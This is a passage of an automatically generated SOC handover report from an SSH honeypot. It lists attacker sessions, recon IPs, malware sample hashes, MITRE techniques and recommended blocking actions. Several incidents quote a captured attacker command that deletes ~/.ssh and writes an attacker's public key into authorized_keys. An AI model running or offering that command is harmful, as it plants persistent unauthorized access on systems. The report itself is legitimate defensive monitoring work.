| `2026-04-24 22:38:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.254.212[.]59` to AbuseIPDB if not already reported
- [ ] Block `211.254.212[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7855e3da075

| Field | Detail |
|---|---|
| **Source IP** | `211.254.212[.]59` |
| **First Seen** | 2026-04-24 22:39 |
| **Last Seen** | 2026-04-24 22:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:39:54` | `cowrie.session.connect` |
| `2026-04-24 22:39:54` | `cowrie.client.version` |
| `2026-04-24 22:39:54` | `cowrie.client.kex` |
| `2026-04-24 22:39:54` | `cowrie.login.success` |
| `2026-04-24 22:39:55` | `cowrie.session.params` |
| `2026-04-24 22:39:55` | `cowrie.command.input` |
| `2026-04-24 22:39:55` | `cowrie.command.failed` |
| `2026-04-24 22:39:55` | `cowrie.log.closed` |
| `2026-04-24 22:39:55` | `cowrie.session.params` |
| `2026-04-24 22:39:55` | `cowrie.command.input` |
| `2026-04-24 22:39:55` | `cowrie.session.file_download` |
| `2026-04-24 22:39:55` | `cowrie.log.closed` |
| `2026-04-24 22:39:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.254.212[.]59` to AbuseIPDB if not already reported
- [ ] Block `211.254.212[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-985729e87667

| Field | Detail |
|---|---|
| **Source IP** | `211.254.212[.]59` |
| **First Seen** | 2026-04-24 22:39 |
| **Last Seen** | 2026-04-24 22:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:39:57` | `cowrie.session.connect` |
| `2026-04-24 22:39:57` | `cowrie.client.version` |
| `2026-04-24 22:39:57` | `cowrie.client.kex` |
| `2026-04-24 22:39:58` | `cowrie.login.success` |
| `2026-04-24 22:39:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.254.212[.]59` to AbuseIPDB if not already reported
- [ ] Block `211.254.212[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae5fcafdabbe

| Field | Detail |
|---|---|
| **Source IP** | `114.98.230[.]202` |
| **First Seen** | 2026-04-24 22:40 |
| **Last Seen** | 2026-04-24 22:40 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:40:08` | `cowrie.session.connect` |
| `2026-04-24 22:40:08` | `cowrie.client.version` |
| `2026-04-24 22:40:09` | `cowrie.client.kex` |
| `2026-04-24 22:40:14` | `cowrie.login.success` |
| `2026-04-24 22:40:14` | `cowrie.session.params` |
| `2026-04-24 22:40:14` | `cowrie.command.input` |
| `2026-04-24 22:40:14` | `cowrie.command.failed` |
| `2026-04-24 22:40:14` | `cowrie.log.closed` |
| `2026-04-24 22:40:15` | `cowrie.session.params` |
| `2026-04-24 22:40:15` | `cowrie.command.input` |
| `2026-04-24 22:40:17` | `cowrie.session.file_download` |
| `2026-04-24 22:40:17` | `cowrie.log.closed` |
| `2026-04-24 22:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.230[.]202` to AbuseIPDB if not already reported
- [ ] Block `114.98.230[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82b740cb6c64

| Field | Detail |
|---|---|
| **Source IP** | `114.98.230[.]202` |
| **First Seen** | 2026-04-24 22:40 |
| **Last Seen** | 2026-04-24 22:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:40:21` | `cowrie.session.connect` |
| `2026-04-24 22:40:21` | `cowrie.client.version` |
| `2026-04-24 22:40:21` | `cowrie.client.kex` |
| `2026-04-24 22:40:23` | `cowrie.login.success` |
| `2026-04-24 22:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.230[.]202` to AbuseIPDB if not already reported
- [ ] Block `114.98.230[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bace4c21f9ac

| Field | Detail |
|---|---|
| **Source IP** | `86.238.165[.]111` |
| **First Seen** | 2026-04-24 22:40 |
| **Last Seen** | 2026-04-24 22:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:40:30` | `cowrie.session.connect` |
| `2026-04-24 22:40:30` | `cowrie.client.version` |
| `2026-04-24 22:40:30` | `cowrie.client.kex` |
| `2026-04-24 22:40:31` | `cowrie.login.success` |
| `2026-04-24 22:40:31` | `cowrie.session.params` |
| `2026-04-24 22:40:31` | `cowrie.command.input` |
| `2026-04-24 22:40:31` | `cowrie.command.failed` |
| `2026-04-24 22:40:31` | `cowrie.log.closed` |
| `2026-04-24 22:40:32` | `cowrie.session.params` |
| `2026-04-24 22:40:32` | `cowrie.command.input` |
| `2026-04-24 22:40:32` | `cowrie.session.file_download` |
| `2026-04-24 22:40:32` | `cowrie.log.closed` |
| `2026-04-24 22:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.238.165[.]111` to AbuseIPDB if not already reported
- [ ] Block `86.238.165[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aac57e8b5e64

| Field | Detail |
|---|---|
| **Source IP** | `86.238.165[.]111` |
| **First Seen** | 2026-04-24 22:40 |
| **Last Seen** | 2026-04-24 22:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:40:34` | `cowrie.session.connect` |
| `2026-04-24 22:40:34` | `cowrie.client.version` |
| `2026-04-24 22:40:34` | `cowrie.client.kex` |
| `2026-04-24 22:40:35` | `cowrie.login.success` |
| `2026-04-24 22:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.238.165[.]111` to AbuseIPDB if not already reported
- [ ] Block `86.238.165[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-091db2d83c53

| Field | Detail |
|---|---|
| **Source IP** | `86.238.165[.]111` |
| **First Seen** | 2026-04-24 22:41 |
| **Last Seen** | 2026-04-24 22:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:41:22` | `cowrie.session.connect` |
| `2026-04-24 22:41:22` | `cowrie.client.version` |
| `2026-04-24 22:41:22` | `cowrie.client.kex` |
| `2026-04-24 22:41:23` | `cowrie.login.success` |
| `2026-04-24 22:41:23` | `cowrie.session.params` |
| `2026-04-24 22:41:23` | `cowrie.command.input` |
| `2026-04-24 22:41:23` | `cowrie.command.failed` |
| `2026-04-24 22:41:23` | `cowrie.log.closed` |
| `2026-04-24 22:41:24` | `cowrie.session.params` |
| `2026-04-24 22:41:24` | `cowrie.command.input` |
| `2026-04-24 22:41:24` | `cowrie.session.file_download` |
| `2026-04-24 22:41:24` | `cowrie.log.closed` |
| `2026-04-24 22:41:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.238.165[.]111` to AbuseIPDB if not already reported
- [ ] Block `86.238.165[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fc4a538bb91

| Field | Detail |
|---|---|
| **Source IP** | `86.238.165[.]111` |
| **First Seen** | 2026-04-24 22:41 |
| **Last Seen** | 2026-04-24 22:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 22:41:26` | `cowrie.session.connect` |
| `2026-04-24 22:41:26` | `cowrie.client.version` |
| `2026-04-24 22:41:27` | `cowrie.client.kex` |
| `2026-04-24 22:41:27` | `cowrie.login.success` |
| `2026-04-24 22:41:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.238.165[.]111` to AbuseIPDB if not already reported
- [ ] Block `86.238.165[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `120.203.25[.]201` | **29** | 2026-04-24 22:09 | 2026-04-24 22:14 | 12m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `148.216.28[.]11` | **27** | 2026-04-24 21:04 | 2026-04-24 21:47 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `37.58.136[.]133` | **27** | 2026-04-24 21:25 | 2026-04-24 21:48 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.104[.]36` | **19** | 2026-04-24 20:59 | 2026-04-24 21:15 | 31m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `114.98.230[.]202` | **18** | 2026-04-24 22:06 | 2026-04-24 22:41 | 4m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `86.238.165[.]111` | **11** | 2026-04-24 22:30 | 2026-04-24 22:42 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `211.254.212[.]59` | **7** | 2026-04-24 22:32 | 2026-04-24 22:41 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `102.214.131[.]55` | 1 | 2026-04-24 21:02 | 2026-04-24 21:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.190.46[.]94` | 1 | 2026-04-24 21:33 | 2026-04-24 21:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.144[.]95` | 1 | 2026-04-24 22:06 | 2026-04-24 22:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.26[.]185` | 1 | 2026-04-24 22:09 | 2026-04-24 22:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.106[.]86` | 1 | 2026-04-24 22:07 | 2026-04-24 22:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.184.134[.]158` | 1 | 2026-04-24 22:04 | 2026-04-24 22:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `189.181.8[.]146` | 1 | 2026-04-24 22:06 | 2026-04-24 22:06 | 30s | 0 | `T1592` | 🟢 LOW |
| `42.51.38[.]125` | 1 | 2026-04-24 20:57 | 2026-04-24 20:57 | 27s | 0 | `T1592` | 🟢 LOW |
| `45.55.151[.]3` | 1 | 2026-04-24 21:27 | 2026-04-24 21:27 | 2s | 0 | `T1592` | 🟢 LOW |
| `61.184.21[.]192` | 1 | 2026-04-24 22:13 | 2026-04-24 22:15 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `86.238.165[.]111` | FR | Orange S.A. | **100** ⚠️ | 2 |
| `102.214.131[.]55` | MR | RIMATEL-SA | **100** ⚠️ | 8 |
| `14.103.104[.]36` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `148.216.28[.]11` | MX | Universidad Michoacana de San Nicolas de Hidalgo | **100** ⚠️ | 50 |
| `211.254.212[.]59` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `37.58.136[.]133` | FR | ADISTA SAS | **100** ⚠️ | 38 |
| `120.48.26[.]185` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 49 |
| `189.181.8[.]146` | MX | Gestión de direccionamiento UniNet | **100** ⚠️ | 0 |
| `118.145.144[.]95` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 18 |
| `120.203.25[.]201` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 239 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 107 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 94 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 49 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 49 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 245 cases |
| Tool 34  | Credential Extractor        | ✅ 201 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 20 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (1.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 94 priority case(s) shown individually · 17 recon entry/entries in table (7 group(s) consolidating 138 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-24T22:43:25Z_
